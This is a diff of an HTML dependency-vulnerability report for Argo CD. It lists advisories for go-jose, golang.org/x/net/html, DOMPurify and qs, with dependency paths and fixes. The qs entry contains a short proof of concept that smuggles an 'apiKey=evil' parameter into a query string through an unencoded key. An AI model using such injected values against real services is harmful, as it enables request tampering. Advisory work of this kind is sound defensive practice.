+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.44.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/gitops-engine@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/replace@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.44.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/gitops-engine@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/util@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.44.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/gitops-engine@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/delete@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/completion@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/cmd/util@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/templates@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/kubectl/pkg/util/term@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/tools/remotecommand@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/client-go/transport/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/httpstream/spdy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        k8s.io/apimachinery/pkg/util/proxy@0.34.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        golang.org/x/net/html@0.44.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://pkg.go.dev/golang.org/x/net/html">golang.org/x/net/html</a> is a package that implements an HTML5-compliant tokenizer and parser.</p>
+        <p>Affected versions of this package are vulnerable to Denial of Service (DoS) in the <code>addText</code> and <code>fosterParent</code> functions of the <code>html</code> package. An attacker can force quadratic allocations and byte copies by supplying HTML with many short text runs separated by ignored end tags, because each append to an existing <code>TextNode</code> reallocates and copies the accumulated <code>Data</code> string.</p>
+        <h2 id="details">Details</h2>
+        <p>Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.</p>
+        <p>Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.</p>
+        <p>One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.</p>
+        <p>When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.</p>
+        <p>Two common types of DoS vulnerabilities:</p>
+        <ul>
+        <li><p>High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, <a href="https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082">commons-fileupload:commons-fileupload</a>.</p>
+        </li>
+        <li><p>Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  <a href="https://snyk.io/vuln/npm:ws:20171108">npm <code>ws</code> package</a></p>
+        </li>
+        </ul>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>golang.org/x/net/html</code> to version 0.62.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/golang/net/commit/4af4fce62e93c5621a316363718b9dc78fbb0355">GitHub Commit</a></li>
+        <li><a href="https://pkg.go.dev/vuln/GO-2026-6860">Go Advisory</a></li>
+        <li><a href="https://go.dev/cl/849365">Go Commit</a></li>
+        <li><a href="https://go.dev/issue/82224">Go Issue</a></li>
+        <li><a href="https://groups.google.com/g/golang-announce/c/sqrs2vTx_Xs">Google Groups Forum</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-GOLANG-GOLANGORGXNETHTML-21762862">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
             <h2 class="card__title">Allocation of Resources Without Limits or Throttling</h2>
             <div class="card__section">
         
@@ -588823,6 +589547,91 @@
         
         </div><!-- .card -->
         <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Inefficient Algorithmic Complexity</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--high">
+                        <span class="label__text">high severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Not Defined</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd/argoproj/argo-cd/v3 <span class="list-paths__item__arrow">›</span> go.mod
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: golang
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            github.com/go-jose/go-jose/v4
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+                                github.com/argoproj/argo-cd/v3@0.0.0 and github.com/go-jose/go-jose/v4@4.1.4
+        
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v4@4.1.4
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/coreos/go-oidc/v3/oidc@3.17.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v4@4.1.4
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Inefficient Algorithmic Complexity in the parsing process of JWKs containing RSA keys due to lack of size and consistency checks on RSA modulus and prime values before validation. An attacker can cause excessive CPU consumption and disrupt service availability by submitting specially crafted JWKs with large or malformed RSA parameters.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>github.com/go-jose/go-jose/v4</code> to version 4.1.6 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/go-jose/go-jose/security/advisories/GHSA-mgcc-cww5-fp2q">GitHub Advisory</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/commit/a0111f82742fa92bceec9ede40845e73319e6230">GitHub Commit</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/releases/tag/v4.1.6">GitHub Release</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOJOSEGOJOSEV4-21755478">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
             <h2 class="card__title">Uncaught Exception</h2>
             <div class="card__section">
         
@@ -588979,6 +589788,82 @@
         
             <div class="cta card__cta">
                 <p><a href="https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOJOSEGOJOSEV3-15875220">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Inefficient Algorithmic Complexity</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--high">
+                        <span class="label__text">high severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Not Defined</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd/argoproj/argo-cd/v3 <span class="list-paths__item__arrow">›</span> go.mod
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: golang
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            github.com/go-jose/go-jose/v3
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    github.com/argoproj/argo-cd/v3@0.0.0, github.com/oauth2-proxy/mockoidc@#caebfff84d25 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/oauth2-proxy/mockoidc@#caebfff84d25
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v3@3.0.1
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Inefficient Algorithmic Complexity in the parsing process of JWKs containing RSA keys due to lack of size and consistency checks on RSA modulus and prime values before validation. An attacker can cause excessive CPU consumption and disrupt service availability by submitting specially crafted JWKs with large or malformed RSA parameters.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>There is no fixed version for <code>github.com/go-jose/go-jose/v3</code>.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/go-jose/go-jose/security/advisories/GHSA-mgcc-cww5-fp2q">GitHub Advisory</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/commit/a0111f82742fa92bceec9ede40845e73319e6230">GitHub Commit</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/releases/tag/v4.1.6">GitHub Release</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOJOSEGOJOSEV3-21755479">More about this vulnerability</a></p>
             </div>
         
         </div><!-- .card -->
@@ -589598,6 +590483,137 @@
         
             <div class="cta card__cta">
                 <p><a href="https://snyk.io/vuln/SNYK-JS-DOMPURIFY-21460657">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Cross-site Scripting (XSS)</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--high">
+                        <span class="label__text">high severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Proof of Concept</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd <span class="list-paths__item__arrow">›</span> ui/yarn.lock
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            dompurify
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    argo-cd-ui@1.0.0, redoc@2.4.0 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        argo-cd-ui@1.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        redoc@2.4.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        dompurify@3.4.13
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://github.com/cure53/DOMPurify">dompurify</a> is a DOM-only XSS sanitizer for HTML, MathML and SVG.</p>
+        <p>Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via <code>_handleHookDetachedNode()</code> in <code>src/purify.ts</code> when <code>IN_PLACE</code> mode is used with a hook that removes a node other than the hook&#39;s own node (such as a parent, ancestor, or unvisited sibling). The function only checks whether <code>currentNode</code> itself lost its parent, so when a hook removes <code>currentNode.parentNode</code> or a later sibling, the detached subtree is never walked or neutralized by DOMPurify. Event handlers on elements in that detached subtree remain armed, and handlers such as <code>img onerror</code> fire after <code>sanitize()</code> returns, resulting in DOM XSS.</p>
+        <p><strong>Note:</strong> This is only exploitable when <code>IN_PLACE: true</code> is used together with a hook (any of <code>beforeSanitizeElements</code>, <code>uponSanitizeElement</code>, <code>afterSanitizeElements</code>, <code>beforeSanitizeAttributes</code>, or <code>afterSanitizeAttributes</code>) that removes a node other than the hook&#39;s own node.</p>
+        <h2 id="details">Details</h2>
+        <p>Cross-site scripting (or XSS) is a code vulnerability that occurs when an attacker “injects” a malicious script into an otherwise trusted website. The injected script gets downloaded and executed by the end user’s browser when the user interacts with the compromised website.</p>
+        <p>This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.</p>
+        <p>Injecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.</p>
+        <p>Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, <code>&lt;</code> can be coded as  <code>&amp;lt</code>; and <code>&gt;</code> can be coded as <code>&amp;gt</code>; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses <code>&lt;</code> and <code>&gt;</code> as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.</p>
+        <p>The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. </p>
+        <h3 id="types-of-attacks">Types of attacks</h3>
+        <p>There are a few methods by which XSS can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Stored</strong></td>
+        <td>Server</td>
+        <td>The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.</td>
+        </tr>
+        <tr>
+        <td><strong>Reflected</strong></td>
+        <td>Server</td>
+        <td>The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.</td>
+        </tr>
+        <tr>
+        <td><strong>DOM-based</strong></td>
+        <td>Client</td>
+        <td>The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.</td>
+        </tr>
+        <tr>
+        <td><strong>Mutated</strong></td>
+        <td></td>
+        <td>The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.</td>
+        </tr>
+        </tbody></table>
+        <h3 id="affected-environments">Affected environments</h3>
+        <p>The following environments are susceptible to an XSS attack:</p>
+        <ul>
+        <li>Web servers</li>
+        <li>Application servers</li>
+        <li>Web application environments</li>
+        </ul>
+        <h3 id="how-to-prevent">How to prevent</h3>
+        <p>This section describes the top best practices designed to specifically protect your code: </p>
+        <ul>
+        <li>Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. </li>
+        <li>Convert special characters such as <code>?</code>, <code>&amp;</code>, <code>/</code>, <code>&lt;</code>, <code>&gt;</code> and spaces to their respective HTML or URL encoded equivalents. </li>
+        <li>Give users the option to disable client-side scripts.</li>
+        <li>Redirect invalid requests.</li>
+        <li>Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.</li>
+        <li>Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.</li>
+        <li>Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.</li>
+        </ul>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>dompurify</code> to version 3.4.17 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/cure53/DOMPurify/security/advisories/GHSA-mrv2-3pqr-j5jr">GitHub Advisory</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-DOMPURIFY-21755401">More about this vulnerability</a></p>
             </div>
         
         </div><!-- .card -->
@@ -777418,6 +778434,110 @@
         
         </div><!-- .card -->
         <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Improper Encoding or Escaping of Output</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--medium">
+                        <span class="label__text">medium severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Proof of Concept</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd <span class="list-paths__item__arrow">›</span> ui/yarn.lock
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            qs
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    argo-cd-ui@1.0.0, superagent@8.1.2 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        argo-cd-ui@1.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        superagent@8.1.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        qs@6.14.2
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        argo-cd-ui@1.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        superagent@8.1.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        formidable@2.1.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        qs@6.14.2
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/qs">qs</a> is a querystring parser that supports nesting and arrays, with a depth limit.</p>
+        <p>Affected versions of this package are vulnerable to Improper Encoding or Escaping of Output via the <code>stringify</code> function when the <code>allowEmptyArrays</code> option is enabled. When an object key contains special characters (such as <code>&amp;</code>, <code>=</code>, or <code>#</code>) and its value is an empty array, the key is returned without encoding, allowing an attacker who controls a key name to inject arbitrary query-string parameters or URL fragments into the serialized output. A consumer that parses the resulting string will see attacker-controlled key-value pairs that were not present in the original object.</p>
+        <h2 id="poc">PoC</h2>
+        <pre><code class="language-js">var qs = require(&quot;qs&quot;);
+        
+        var query = qs.stringify({ q: &quot;hi&quot;, &quot;x&amp;apiKey=evil&amp;y&quot;: [] }, { allowEmptyArrays: true });
+        // &quot;q=hi&amp;x&amp;apiKey=evil&amp;y[]&quot;
+        qs.parse(query);
+        // { q: &quot;hi&quot;, x: &quot;&quot;, apiKey: &quot;evil&quot;, y: [&quot;&quot;] }
+        
+        qs.stringify({ &quot;x#&quot;: [], z: &quot;1&quot; }, { allowEmptyArrays: true });
+        // &quot;x#[]&amp;z=1&quot;: in a URL, everything after &quot;#&quot; becomes the fragment
+        </code></pre>
+        <p><strong>Note:</strong> The PoC uses the <code>qs</code> npm package with the <code>allowEmptyArrays</code> option and states no specific runtime version or operating system.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>qs</code> to version 6.16.2 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/ljharb/qs/security/advisories/GHSA-w4cr-vjpx-p82q">GitHub Advisory</a></li>
+        <li><a href="https://github.com/ljharb/qs/commit/234d5051f5071efaa025a7ca9e4d34a56a460a1b">GitHub Commit</a></li>
+        <li><a href="https://github.com/ljharb/qs/commit/5d3b1b9ec6afd0cfc760c8e12862873789a32fc8">GitHub Commit</a></li>
+        <li><a href="https://github.com/ljharb/qs/issues/626">GitHub Issue</a></li>
+        <li><a href="https://github.com/ljharb/qs/pull/561">GitHub PR</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-QS-21755395">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
             <h2 class="card__title">Prototype Pollution</h2>
             <div class="card__section">
         
@@ -780866,6 +781986,346 @@
         
         </div><!-- .card -->
         <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Uncontrolled Recursion</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--medium">
+                        <span class="label__text">medium severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Not Defined</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd/argoproj/argo-cd/v3 <span class="list-paths__item__arrow">›</span> go.mod
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: golang
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            github.com/go-jose/go-jose/v4/json
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    github.com/argoproj/argo-cd/v3@0.0.0, github.com/go-jose/go-jose/v4@4.1.4 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v4@4.1.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v4/json@4.1.4
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/coreos/go-oidc/v3/oidc@3.17.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v4@4.1.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v4/json@4.1.4
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Uncontrolled Recursion through the JSON parsing process. An attacker can cause the application to crash by submitting deeply nested arrays or objects, leading to stack exhaustion.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>github.com/go-jose/go-jose/v4/json</code> to version 4.1.5 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/go-jose/go-jose/security/advisories/GHSA-vvm8-gf78-28g4">GitHub Advisory</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/commit/a31af25836222f4c45d366d6e8f9b1049dd9935a">GitHub Commit</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/pull/290">GitHub PR</a></li>
+        <li><a href="https://github.com/go-jose/go-jose/releases/tag/v4.1.5">GitHub Release</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOJOSEGOJOSEV4JSON-21755481">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Improper Validation of Array Index</h2>
+            <div class="card__section">
+        
+                <div class="card__labels">
+                    <div class="label label--medium">
+                        <span class="label__text">medium severity</span>
+                    </div>
+                    <div class="label label--exploit">
+                        <span class="label__text">Exploit: Not Defined</span>
+                    </div>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Manifest file: /argo-cd/argoproj/argo-cd/v3 <span class="list-paths__item__arrow">›</span> go.mod
+                    </li>
+                    <li class="card__meta__item">
+                        Package Manager: golang
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            github.com/go-jose/go-jose/v4/cipher
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    github.com/argoproj/argo-cd/v3@0.0.0, github.com/go-jose/go-jose/v4@4.1.4 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v4@4.1.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v4/cipher@4.1.4
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        github.com/argoproj/argo-cd/v3@0.0.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/coreos/go-oidc/v3/oidc@3.17.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v4@4.1.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        github.com/go-jose/go-jose/v4/cipher@4.1.4
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Improper Validation of Array Index in the CBC-HMAC decryption process. An attacker can cause a panic and disrupt service availability by submitting specially crafted ciphertext that results in an empty buffer being passed to the unpadding routine. This is only exploitable if applications decrypt attacker-controlled ciphertext using A128CBC-HS256, A192CBC-HS384, or A256CBC-HS512 content-encryption algorithms.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>github.com/go-jose/go-jose/v4/cipher</code> to version 4.1.5 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
